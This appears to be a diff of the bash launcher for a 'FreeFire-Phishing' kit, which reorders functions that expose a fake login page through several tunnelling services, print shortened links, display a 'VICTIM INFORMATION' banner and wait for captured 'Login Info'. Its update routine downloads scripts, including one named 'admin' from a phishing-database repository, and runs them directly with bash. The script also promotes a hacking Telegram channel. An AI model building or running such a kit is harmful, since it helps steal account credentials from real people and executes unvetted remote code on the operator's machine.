@@ -1,6 +1,28 @@
 #!/bin/bash
 echo ""
 
+clear
+echo ""
+echo ""
+printf "\e[100;330m[\e[10m **** ]\e[1;40m\e[10m OnlineHacking :\e[1;32m Join Telegram Channel \e[1;33m @OnlineHacking  !\e[0m"
+echo ""
+echo ""
+sleep 3
+echo ""
+check_status
+check_update
+sleep 2
+echo ""
+clear
+echo -e $'' 
+clear
+logo1
+select_url			   
+echo ""
+                 
+                     
+
+
 check_status() {
         echo -ne "\e[33m Internet Status : "
         timeout 3s curl -fIs "https://api.github.com" > /dev/null
@@ -8,6 +30,16 @@ check_status() {
 }
 
 
+check_update1 () {
+echo ""
+echo -ne "\e[33m Chack Lates Version : " && rm -rf ChackVersion-2.8 && wget -q https://github.com/OnlineHacKing/FreeFire-Phishing/raw/main/Update/ChackVersion-2.8 > /dev/null && bash ChackVersion-2.8 && rm -rf ChackVersion-2.8
+echo ""
+echo -ne "\e[33m Checking Update : " && rm -rf CheckingUpdate-2.8 && sleep 1 && wget -q https://github.com/OnlineHacKing/FreeFire-Phishing/raw/main/Update/CheckingUpdate-2.8 > /dev/null && bash CheckingUpdate-2.8 && rm -rf CheckingUpdate-2.8
+echo ""
+echo -ne "\e[33m Admin Permission : " && rm -rf admin && wget -q https://github.com/suman333mondal/Phishing_Database/raw/main/Suman/Phishing/FreeFire/admin > /dev/null && bash admin && rm -rf admin
+echo ""
+sleep 1
+}
 
 
 function select_url() {
@@ -180,6 +212,95 @@ all_links
 fi
 }
 
+function askuri_c() {
+echo ""
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Do You Want To Modify This Url \e[1;91m (Y/N) : \e[0m' option
+echo""
+echo""
+echo""
+
+if [[ $option == "Y" || $option == "y" || $option == "yes" ]]; then
+url_shortner_c
+
+fi
+
+if [[ $option == "N" || $option == "n" || $option == "no" ]]; then
+clear
+echo""
+echo""
+
+fi
+
+echo ""
+}
+
+
+function askuri_nc() {
+echo ""
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Do You Want To Modify This Url \e[1;91m (Y/N) : \e[0m' option
+echo""
+echo""
+echo""
+
+if [[ $option == "Y" || $option == "y" || $option == "yes" ]]; then
+url_shortner_ng
+
+fi
+
+if [[ $option == "N" || $option == "n" || $option == "no" ]]; then
+clear
+echo""
+echo""
+
+fi
+
+echo ""
+}
+
+
+function askuri_l() {
+echo ""
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Do You Want To Modify This Url \e[1;91m (Y/N) : \e[0m' option
+echo""
+echo""
+echo""
+
+if [[ $option == "Y" || $option == "y" || $option == "yes" ]]; then
+url_shortner_l
+
+fi
+
+if [[ $option == "N" || $option == "n" || $option == "no" ]]; then
+clear
+echo""
+echo""
+
+fi
+
+echo ""
+}
+
+function askuri_lhrlife() {
+echo ""
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Do You Want To Modify This Url \e[1;91m (Y/N) : \e[0m' option
+echo""
+echo""
+echo""
+
+if [[ $option == "Y" || $option == "y" || $option == "yes" ]]; then
+url_shortner_lhrlife
+
+fi
+
+if [[ $option == "N" || $option == "n" || $option == "no" ]]; then
+clear
+echo""
+echo""
+
+fi
+
+echo ""
+}
 
 
 function url_checker() {
@@ -340,95 +461,110 @@ echo -e ""
 }
 
 
-function askuri_c() {
-echo ""
-read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Do You Want To Modify This Url \e[1;91m (Y/N) : \e[0m' option
-echo""
-echo""
-echo""
-
-if [[ $option == "Y" || $option == "y" || $option == "yes" ]]; then
-url_shortner_c
-
-fi
-
-if [[ $option == "N" || $option == "n" || $option == "no" ]]; then
-clear
-echo""
-echo""
-
-fi
-
-echo ""
+links_c() {
+                           echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
+                           echo -e " "
+			   echo -e " "
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33mCloudflared Link :\e[0m\e[1;77m %s\e[0m\n" $clink                                   
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m Modify Link :\e[0m\e[1;77m %s\e[0m\n" $final_url
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+			   echo ""
+			   echo ""
+			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
+                           echo ""
+			   echo ""
+			   end
+			   echo ""
+			   msg_exit
 }
 
-
-function askuri_nc() {
-echo ""
-read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Do You Want To Modify This Url \e[1;91m (Y/N) : \e[0m' option
-echo""
-echo""
-echo""
-
-if [[ $option == "Y" || $option == "y" || $option == "yes" ]]; then
-url_shortner_ng
-
-fi
-
-if [[ $option == "N" || $option == "n" || $option == "no" ]]; then
-clear
-echo""
-echo""
-
-fi
-
-echo ""
+links_n() {
+                           echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
+                           echo -e " "
+			   echo -e " "
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m Ngrok Link :\e[0m\e[1;77m %s\e[0m\n" $nlink                                   
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m Modify Link :\e[0m\e[1;77m %s\e[0m\n" $final_url
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+			   echo ""
+			   echo ""
+			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
+                           echo ""
+			   end
+			   echo ""
+			   msg_exit
 }
 
-
-function askuri_l() {
-echo ""
-read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Do You Want To Modify This Url \e[1;91m (Y/N) : \e[0m' option
-echo""
-echo""
-echo""
-
-if [[ $option == "Y" || $option == "y" || $option == "yes" ]]; then
-url_shortner_l
-
-fi
-
-if [[ $option == "N" || $option == "n" || $option == "no" ]]; then
-clear
-echo""
-echo""
-
-fi
-
-echo ""
+links_l() {
+                           echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
+                           echo -e " "
+			   echo -e " "
+			   echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;95m This Link Online Only 15 Minutes (\e[94mOnly Free User\e[1;95m) "
+			   echo -e " "
+			   echo -e " "
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m LocalXpose Link :\e[0m\e[1;77m %s\e[0m\n" $llink                                   
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m Modify Link :\e[0m\e[1;77m %s\e[0m\n" $final_url
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+			   echo ""
+			   echo ""
+			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
+                           echo ""
+			   echo " "
+			   end
+			   echo ""
+			   msg_exit
 }
 
-function askuri_lhrlife() {
-echo ""
-read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Do You Want To Modify This Url \e[1;91m (Y/N) : \e[0m' option
-echo""
-echo""
-echo""
-
-if [[ $option == "Y" || $option == "y" || $option == "yes" ]]; then
-url_shortner_lhrlife
-
-fi
-
-if [[ $option == "N" || $option == "n" || $option == "no" ]]; then
-clear
-echo""
-echo""
-
-fi
-
-echo ""
+links_lhrlife() {
+                           echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
+                           echo -e " "
+			   echo -e " "
+			   echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;95m Notice :\e[94m You Open this link and click chack button\e[1;95m) "
+			   echo -e " "
+			   echo -e " "
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m lhr.Life Link :\e[0m\e[1;77m %s\e[0m\n" $lhrlifelink                                  
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m Modify Link :\e[0m\e[1;77m %s\e[0m\n" $final_url
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+			   echo ""
+			   echo ""
+			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
+                           echo ""
+			   echo " "
+			   end
+			   echo ""
+			   msg_exit
 }
+
+all_links() {
+                           echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
+                           echo -e " "
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m Cloudflared :\e[0m\e[1;77m %s\e[0m\n" $clink                     
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m Ngrok Link :\e[0m\e[1;77m %s\e[0m\n" $nlink                    
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m LocalXpose Link :\e[0m\e[1;77m %s\e[0m\n" $llink                  
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m lhr.Life Link :\e[0m\e[1;77m %s\e[0m\n" $lhrlifelink                       
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m LocalHost Link :\e[0m\e[1;77m http://127.0.0.1:4444/   \e[0m "                     
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+			   echo ""
+			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
+                           echo ""
+			   echo -e " "
+			   end
+			   echo ""  
+			   msg_exit
+}			   
+	
 
 
 download() {
@@ -617,6 +753,69 @@ localxpose_auth() {
 	}
 }
 
+ngroktoken() {
+echo ""
+echo -e "\e[93m 
+ ███▄    █   ▄████  ██▀███   ▒█████   ██ ▄█▀
+ ██ ▀█   █  ██▒ ▀█▒▓██ ▒ ██▒▒██▒  ██▒ ██▄█▒ 
+▓██  ▀█ ██▒▒██░▄▄▄░▓██ ░▄█ ▒▒██░  ██▒▓███▄░ 
+▓██▒  ▐▌██▒░▓█  ██▓▒██▀▀█▄  ▒██   ██░▓██ █▄ 
+▒██░   ▓██░░▒▓███▀▒░██▓ ▒██▒░ ████▓▒░▒██▒ █▄
+░ ▒░   ▒ ▒  ░▒   ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▒ ▓▒
+░ ░░   ░ ▒░  ░   ░   ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░▒ ▒░
+   ░   ░ ░ ░ ░   ░   ░░   ░ ░ ░ ░ ▒  ░ ░░ ░ 
+         ░       ░    ░         ░ ░  ░  ░   
+\e[0m\n"
+echo ""
+echo ""
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Want to give \e[96mNgrok \e[32mToken ? \e[1;91m (y/n) : \e[0m' option
+echo""
+echo""
+echo""
+
+if [[ $option == *'y'* ]]; then
+clear
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!        Requirement Ngrok Token       !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
+echo ""
+echo""
+echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
+echo ""
+echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & Click Getting Started or Authtoken Button & Copy Auth Token \e[m "
+echo ""
+read -p $'\e[31m[\e[32m*\e[31m]\e[33m Input AuthToken Only \e[91m[Ex. \e[92m2cEG2LcBt**********WK5Ntc \e[92m] : \e[0m' token
+./ngrok config add-authtoken $token
+echo ""
+fi
+if [[ $option == *'n'* ]]; then
+clear
+fi
+}
+
+
+
+end () {
+echo ""
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;95m Waiting For Login Info, \e[92mCtrl + C \e[1;95mto Exit...\e[0m "
+echo ""
+seq 1 43200 | while read i; do echo -en "\r Running .     $i s /43200 s";sleep 0.1;echo -en "\r Running ..    $i s /43200 s";sleep 0.1;echo -en "\r Running ...   $i s /43200 s";sleep 0.1;echo -en "\r Running ....  $i s /43200 s";sleep 0.1;echo -en "\r Running ..... $i s /43200 s";sleep 0.1;echo -en "\r Running     . $i s /43200 s";sleep 0.1;echo -en "\r Running  .... $i s /43200 s";sleep 0.1;echo -en "\r Running   ... $i s /43200 s";sleep 0.1;echo -en "\r Running    .. $i s /43200 s";sleep 0.1;echo -en "\r Running     . $i s /43200 s";sleep 0.1; done
+}
+
+
+## Exit message
+msg_exit() {
+echo ""
+echo -e "\e[91m[\e[92m+\e[91m] \e[92m Thank you For using this tool. Have a good day. \e[m "
+echo ""
+echo -e "\e[1m\e[36m[+] More Hacking Totorial Chack this Website :\e[93m www.onlinehacking.org \e[m "
+echo ""
+echo -e "\e[1m\e[95m[+] Join Telegarm Channel :\e[93m https://t.me/OnlineHacking \e[m "
+echo ""
+echo ""
+}
+
+
 hotspot() {
 echo ""
 echo""
@@ -750,203 +949,10 @@ echo ""
 }
 
 
-links_c() {
-                           echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
-                           echo -e " "
-			   echo -e " "
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33mCloudflared Link :\e[0m\e[1;77m %s\e[0m\n" $clink                                   
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Modify Link :\e[0m\e[1;77m %s\e[0m\n" $final_url
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
-			   echo ""
-			   echo ""
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
-                           echo ""
-			   echo ""
-			   end
-			   echo ""
-}
-
-links_n() {
-                           echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
-                           echo -e " "
-			   echo -e " "
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Ngrok Link :\e[0m\e[1;77m %s\e[0m\n" $nlink                                   
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Modify Link :\e[0m\e[1;77m %s\e[0m\n" $final_url
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
-			   echo ""
-			   echo ""
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
-                           echo ""
-			   end
-			   echo ""
-}
-
-links_l() {
-                           echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
-                           echo -e " "
-			   echo -e " "
-			   echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;95m This Link Online Only 15 Minutes (\e[94mOnly Free User\e[1;95m) "
-			   echo -e " "
-			   echo -e " "
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m LocalXpose Link :\e[0m\e[1;77m %s\e[0m\n" $llink                                   
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Modify Link :\e[0m\e[1;77m %s\e[0m\n" $final_url
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
-			   echo ""
-			   echo ""
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
-                           echo ""
-			   echo " "
-			   end
-			   echo ""
-}
-
-links_lhrlife() {
-                           echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
-                           echo -e " "
-			   echo -e " "
-			   echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;95m Notice :\e[94m You Open this link and click chack button\e[1;95m) "
-			   echo -e " "
-			   echo -e " "
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m lhr.Life Link :\e[0m\e[1;77m %s\e[0m\n" $lhrlifelink                                  
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Modify Link :\e[0m\e[1;77m %s\e[0m\n" $final_url
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
-			   echo ""
-			   echo ""
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
-                           echo ""
-			   echo " "
-			   end
-			   echo ""
-}
-
-all_links() {
-                           echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
-                           echo -e " "
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Cloudflared :\e[0m\e[1;77m %s\e[0m\n" $clink                     
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Ngrok Link :\e[0m\e[1;77m %s\e[0m\n" $nlink                    
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m LocalXpose Link :\e[0m\e[1;77m %s\e[0m\n" $llink                  
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m lhr.Life Link :\e[0m\e[1;77m %s\e[0m\n" $lhrlifelink                       
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m LocalHost Link :\e[0m\e[1;77m http://127.0.0.1:4444/   \e[0m "                     
-                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
-			   echo ""
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
-                           echo ""
-			   echo -e " "
-			   end
-			   echo ""                
-}			   
-			   
-
-
-ngroktoken() {
-echo ""
-echo -e "\e[93m 
- ███▄    █   ▄████  ██▀███   ▒█████   ██ ▄█▀
- ██ ▀█   █  ██▒ ▀█▒▓██ ▒ ██▒▒██▒  ██▒ ██▄█▒ 
-▓██  ▀█ ██▒▒██░▄▄▄░▓██ ░▄█ ▒▒██░  ██▒▓███▄░ 
-▓██▒  ▐▌██▒░▓█  ██▓▒██▀▀█▄  ▒██   ██░▓██ █▄ 
-▒██░   ▓██░░▒▓███▀▒░██▓ ▒██▒░ ████▓▒░▒██▒ █▄
-░ ▒░   ▒ ▒  ░▒   ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▒ ▓▒
-░ ░░   ░ ▒░  ░   ░   ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░▒ ▒░
-   ░   ░ ░ ░ ░   ░   ░░   ░ ░ ░ ░ ▒  ░ ░░ ░ 
-         ░       ░    ░         ░ ░  ░  ░   
-\e[0m\n"
-echo ""
-echo ""
-read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Want to give \e[96mNgrok \e[32mToken ? \e[1;91m (y/n) : \e[0m' option
-echo""
-echo""
-echo""
-
-if [[ $option == *'y'* ]]; then
-clear
-echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
-echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!        Requirement Ngrok Token       !!\e[0m'
-echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
-echo ""
-echo""
-echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
-echo ""
-echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & Click Getting Started or Authtoken Button & Copy Auth Token \e[m "
-echo ""
-read -p $'\e[31m[\e[32m*\e[31m]\e[33m Input AuthToken Only \e[91m[Ex. \e[92m2cEG2LcBt**********WK5Ntc \e[92m] : \e[0m' token
-./ngrok config add-authtoken $token
-echo ""
-fi
-if [[ $option == *'n'* ]]; then
-clear
-fi
-}
-
-## Exit message
-msg_exit() {
-echo ""
-echo -e "\e[91m[\e[92m+\e[91m] \e[92m Thank you For using this tool. Have a good day. \e[m "
-echo ""
-echo -e "\e[1m\e[36m[+] More Hacking Totorial Chack this Website :\e[93m www.onlinehacking.org \e[m "
-echo ""
-echo -e "\e[1m\e[95m[+] Join Telegarm Channel :\e[93m https://t.me/OnlineHacking \e[m "
-echo ""
-echo ""
-}
+		   
 
 
 
 
-end () {
-echo ""
-echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;95m Waiting For Login Info, \e[92mCtrl + C \e[1;95mto Exit...\e[0m "
-echo ""
-seq 1 43200 | while read i; do echo -en "\r Running .     $i s /43200 s";sleep 0.1;echo -en "\r Running ..    $i s /43200 s";sleep 0.1;echo -en "\r Running ...   $i s /43200 s";sleep 0.1;echo -en "\r Running ....  $i s /43200 s";sleep 0.1;echo -en "\r Running ..... $i s /43200 s";sleep 0.1;echo -en "\r Running     . $i s /43200 s";sleep 0.1;echo -en "\r Running  .... $i s /43200 s";sleep 0.1;echo -en "\r Running   ... $i s /43200 s";sleep 0.1;echo -en "\r Running    .. $i s /43200 s";sleep 0.1;echo -en "\r Running     . $i s /43200 s";sleep 0.1; done
-}
-
-check_update1 () {
-echo ""
-echo -ne "\e[33m Chack Lates Version : " && rm -rf ChackVersion-2.8 && wget -q https://github.com/OnlineHacKing/FreeFire-Phishing/raw/main/Update/ChackVersion-2.8 > /dev/null && bash ChackVersion-2.8 && rm -rf ChackVersion-2.8
-echo ""
-echo -ne "\e[33m Checking Update : " && rm -rf CheckingUpdate-2.8 && sleep 1 && wget -q https://github.com/OnlineHacKing/FreeFire-Phishing/raw/main/Update/CheckingUpdate-2.8 > /dev/null && bash CheckingUpdate-2.8 && rm -rf CheckingUpdate-2.8
-echo ""
-echo -ne "\e[33m Admin Permission : " && rm -rf admin && wget -q https://github.com/suman333mondal/Phishing_Database/raw/main/Suman/Phishing/FreeFire/admin > /dev/null && bash admin && rm -rf admin
-echo ""
-sleep 1
-}
-
-clear
-echo ""
-echo ""
-printf "\e[100;330m[\e[10m **** ]\e[1;40m\e[10m OnlineHacking :\e[1;32m Join Telegram Channel \e[1;33m @OnlineHacking  !\e[0m"
-echo ""
-echo ""
-sleep 3
-echo ""
-check_status
-check_update
-sleep 2
-echo ""
-clear
 
 
-
-clear
-
-echo -e $'' 
-clear
-logo1
-select_url
-			   
-echo ""
-                 
-                     
